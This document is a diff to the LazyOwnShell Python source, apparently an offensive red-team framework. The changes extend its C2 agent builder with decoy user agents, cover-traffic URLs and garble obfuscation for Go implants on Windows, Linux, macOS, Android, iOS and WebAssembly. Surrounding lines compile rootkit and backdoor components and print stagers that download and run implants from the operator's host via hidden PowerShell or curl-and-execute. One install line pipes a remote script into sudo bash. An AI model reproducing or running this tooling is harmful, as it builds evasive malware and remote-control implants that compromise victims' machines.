@@ -139,6 +139,7 @@ class LazyOwnShell(cmd2.Cmd):
         "halt": "sh sudo shutdown -h now",
         "hash": "sh cat sessions/hash*",
         "hosts": "sh sudo nano /etc/hosts",
+        "hosts_discover": "sh ./modules/hostdiscover.sh",
         "iasniff": "sys sudo python3 modules/ia_network_analysis.py --mode console",
         "info": "sh echo \"<?php phpinfo(); ?>\" > sessions/info.php",
         "install_shark": 'sys cd external/.exploit/shark && sudo wget -qO- https://github.com/Bhaviktutorials/shark/raw/master/setup | sudo bash',
@@ -264,7 +265,13 @@ class LazyOwnShell(cmd2.Cmd):
             "sleep_start": 207,
             "c2_maleable_route": "/gmail/v1/users/",
             "user_agent_win": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-            "user_agent_lin": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",            
+            "user_agent_lin": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+            "user_agent_1" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
+            "user_agent_2" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
+            "user_agent_3" : "Mozilla/5.0 (Linux; LAzyOwnRedTeam 66_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
+            "url_trafic_1" : "https://www.google-analytics.com/collect?v=1&_v=j81&a=123456789&t=pageview&_s=1&dl=https%3A%2F%2Fexample.com%2F&ul=en-us&de=UTF-8&dt=Example%20Page",
+            "url_trafic_2" : "https://api.azure.com/v1/status?client_id=123456789&region=us-east-1",
+            "url_trafic_3" : "https://www.youtube.com/watch?v=1i0shWLFfuI&list=PLW9Qe5HJK5CFXyIsF9b0NB6n9EY8Am3YZ",
             "rat_key": "82e672ae054aa4de6f042c888111686a",
             "startip": "192.168.1.1",
             "endip": "192.168.1.254",
@@ -10403,20 +10410,26 @@ class LazyOwnShell(cmd2.Cmd):
     
     @cmd2.with_category(command_and_control_category)
     def do_c2(self, line):
-        """
-        Handles the execution of a C2 (Command and Control) server setup command.
+        """Handle C2 server setup and agent compilation.
 
-        This function performs the following tasks:
-        1. Retrieves and validates the local host (lhost) and local port (lport) parameters.
-        2. Checks if the required file `modules/run` exists.
-        3. Reads the content of the `modules/run` file, replaces placeholders with actual values (lport, line, lhost),
-        and copies the updated content to the clipboard.
-        4. Prompts the user to start the C2 server, and if confirmed, executes the server command.
-        5. Provides a warning about shutting down the server.
+        This method manages the process of setting up a Command and Control (C2)
+        server and compiling a corresponding agent for various platforms.
 
         Args:
-            line (str): The victim ID or command line to be used by the C2 server.
-                         Optional: You can append '1' to use a Cloudflare tunnel, e.g., 'victim-1 1'.
+            line (str): Specifies the victim ID and optional C2 server configurations.
+                - Victim ID: The identifier for the target agent.
+                - Tunnel Option (optional): Append '1' to use a Cloudflare tunnel.
+                - Target Choice (optional): A number from '1' to '7' to specify the
+                agent platform (default is '1' for Windows PowerShell).
+                    - '1': Windows PowerShell
+                    - '2': Linux Shell
+                    - '3': Windows Batch
+                    - '4': macOS Shell
+                    - '5': Android Shell
+                    - '6': iOS Shell
+                    - '7': WebAssembly Shell
+                - Tunnel Toggle (optional): After the victim ID and target choice,
+                you can append '1' to enable the Cloudflare tunnel or '0' to disable it.
 
         Returns:
             None
@@ -10424,14 +10437,18 @@ class LazyOwnShell(cmd2.Cmd):
         Raises:
             None
 
-        Example:
-            c2 victim-1
-            c2 victim-2 1
+        Example Usage:
+            c2 victim-1  # Compiles a Windows PowerShell agent
+            c2 victim-2 2 # Compiles a Linux Shell agent
+            c2 victim-3 1 1 # Compiles a Windows PowerShell agent with Cloudflare tunnel
 
         Notes:
-            - Ensure that the `lhost` and `lport` parameters are valid before calling this function.
-            - The `modules/run` file must exist and be correctly formatted.
-            - The server command is executed using `os.system`, which may require additional handling for security.
+            - Ensure the 'lhost' and 'c2_port' parameters are correctly set in the
+            `payload.json` config file before calling this method.
+            - The `modules/run` file and files in `modules/backdoor/` and
+            `modules/rootkit/` directories must exist for the agent compilation
+            process.
+            - The go artifactory is ofuscated by garble if is installed
         """
 
         use_tunnel = False
@@ -10523,11 +10540,22 @@ class LazyOwnShell(cmd2.Cmd):
         base64_encoded = base64.b64encode(random_bytes)
         user_agent_win = self.params["user_agent_win"]
         user_agent_lin = self.params["user_agent_lin"]
+        user_agent_1 = self.params["user_agent_1"]
+        user_agent_2 = self.params["user_agent_2"]
+        user_agent_3 = self.params["user_agent_3"]
+        url_trafic_1 = self.params["url_trafic_1"]
+        url_trafic_2 = self.params["url_trafic_2"]
+        url_trafic_3 = self.params["url_trafic_3"]
+        gocompiler = "go build"
         stealth = "True"
         random_string = base64_encoded.decode('utf-8')[:12]
         working_dir = f"{path}/sessions/"
 
-
+        if not is_binary_present("garble"):
+            cmd_garble = "go install github.com/burrowers/garble@latest"
+            self.cmd(cmd_garble)
+        else:
+            gocompiler = "garble -literals -tiny build "
 
         if not choice:
             choice = input("    [!] choice target windows 1, linux 2, windows bat 3, mac 4, android 5, IOS 6, WebAssembly 7 (default 1) : ") or '1'
@@ -10682,7 +10710,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         AES_KEY_hex = AES_KEY.hex()
         
-        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex).replace('{stealth}', stealth)
+        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex).replace('{stealth}', stealth).replace('{user_agent_1}', user_agent_1).replace('{user_agent_2}', user_agent_2).replace('{user_agent_3}', user_agent_3).replace('{url_trafic_1}', url_trafic_1).replace('{url_trafic_2}', url_trafic_2).replace('{url_trafic_3}', url_trafic_3)
         content_ws = content_ws.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex).replace('{stealth}', stealth)
         
         monrevlin_content = monrevlin_content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep).replace("{maleable}",maleable).replace("{useragent}",user_agent).replace('{key}', AES_KEY_hex)
@@ -10714,11 +10742,11 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(cmd)
         if platform == "linux":
             binary = line
-            compile_command = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
-            compile_command_ws = f"cd sessions && CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
-            compile_command2 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            compile_command3 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -o sessions/server_{binary} {server_go}"
-            compile_command4 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags=\"-s -w\" -o sessions/monrevlin {monrevlin}"
+            compile_command = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            compile_command_ws = f"cd sessions && CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
+            compile_command2 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
+            compile_command3 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o sessions/server_{binary} {server_go}"
+            compile_command4 = f"CGO_ENABLED=0 GOOS=linux GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o sessions/monrevlin {monrevlin}"
             command_mon = f"gcc -o {self.sessions_dir}/monrev {self.sessions_dir}/mr.c -lpthread  -lssl -lcrypto"
             command_rootkit = f"gcc -fPIC -shared -o {rootkit} -ldl {path}/sessions/mrhyde.c"
             cplib = 'cp /lib/x86_64-linux-gnu/libc.so.6 sessions/ && cp /lib64/ld-linux-x86-64.so.2 sessions/'
@@ -10752,10 +10780,10 @@ class LazyOwnShell(cmd2.Cmd):
 
         elif platform == "windows":
             binary = f"{line}.exe"
-            compile_command = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
-            compile_command_ws_win = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
-            compile_command2 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            compile_command3 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o server_{binary} {server_go}"
+            compile_command = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            compile_command_ws_win = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo_ws} {implant_go_ws}"
+            compile_command2 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
+            compile_command3 = f"CGO_ENABLED=0 GOOS=windows GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             compile_cw = f"x86_64-w64-mingw32-gcc -o sessions/b{line}.exe sessions/wmr.c -lws2_32 -lwininet"
             command_mrhyde = f"x86_64-w64-mingw32-gcc -shared -o {path}/sessions/mrhyde.dll {path}/sessions/mrhydew.c -lkernel32 -luser32 -ladvapi32"
             print_msg(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{implant_go} -OutFile {implant_go} ; .\\{implant_go}`\"\"")
@@ -10775,9 +10803,9 @@ class LazyOwnShell(cmd2.Cmd):
 
         elif platform == "darwin":
             binary = line
-            compile_command = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
-            compile_command2 = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            compile_command3 = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags=\"-s -w\" -o server_{binary} {server_go}"
+            compile_command = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            compile_command2 = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
+            compile_command3 = f"CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
             print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
 
@@ -10789,9 +10817,9 @@ class LazyOwnShell(cmd2.Cmd):
 
         elif platform == "android":
             binary = line
-            compile_command = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
-            compile_command2 = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            compile_command3 = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 go build -ldflags=\"-s -w\" -o server_{binary} {server_go}"
+            compile_command = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            compile_command2 = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
+            compile_command3 = f"CGO_ENABLED=0 GOOS=android GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
             print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
 
@@ -10803,9 +10831,9 @@ class LazyOwnShell(cmd2.Cmd):
 
         elif platform == "ios":
             binary = line
-            compile_command = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
-            compile_command2 = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            compile_command3 = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 go build -ldflags=\"-s -w\" -o server_{binary} {server_go}"
+            compile_command = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            compile_command2 = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
+            compile_command3 = f"CGO_ENABLED=1 GOOS=ios GOARCH=arm64 {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
             print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
 
@@ -10817,9 +10845,9 @@ class LazyOwnShell(cmd2.Cmd):
 
         elif platform == "webassembly":
             binary = line
-            compile_command = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm go build -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
-            compile_command2 = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm go build -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
-            compile_command3 = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm go build -ldflags=\"-s -w\" -o server_{binary} {server_go}"
+            compile_command = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o {implantgo} {implant_go}"
+            compile_command2 = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o {implantgo2} {implant_go2}"
+            compile_command3 = f"CGO_ENABLED=0 GOOS=js GOARCH=wasm {gocompiler} -ldflags=\"-s -w\" -o server_{binary} {server_go}"
             print_msg(f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &")
             print_msg(f"curl -o l_{line} http://{lhost}/{line} ; chmod +x l_{line} ; ./l_{line} &")
 
@@ -26122,9 +26150,13 @@ class LazyOwnShell(cmd2.Cmd):
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.load_yaml_plugins()
-    p.onecmd("check_update")
-    p.onecmd("graph")
-    
+    try:
+        p.onecmd("check_update")
+        p.onecmd("graph")
+    except Exception as e:
+        print_error(f"Error: {e}")
+
+
     old = False
     if arguments:
         if arg.startswith("-c"):
